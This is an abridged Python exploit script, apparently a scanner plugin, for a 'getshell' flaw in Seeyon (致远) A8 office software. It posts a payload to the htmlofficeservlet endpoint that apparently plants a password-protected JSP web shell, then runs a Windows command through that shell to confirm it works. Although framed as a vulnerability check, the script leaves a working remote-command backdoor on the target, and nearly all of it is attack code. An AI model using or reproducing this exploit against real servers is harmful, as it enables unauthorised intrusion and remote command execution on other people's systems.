...
'''
name: 致远A8 getshell
referer: https://www.uedbox.com/post/57906/
author: qianxiao996
description: 致远A8 getshell
'''
import sys
import requests
import warnings
...
class a8_getshell:
    ...
    def run(self):
        ...
        try:
            r = requests.post(self.url + '/seeyon/htmlofficeservlet', data=payload)
            r = requests.get(
                self.url + '/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+wangming',headers=headers)
            if "wangming" in r.text:
                result[2]='存在'
                result[1]=self.url + '/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+wangming'
...
if __name__ == "__main__":
    ...
    testVuln = a8_getshell(sys.argv[1])
    testVuln.run()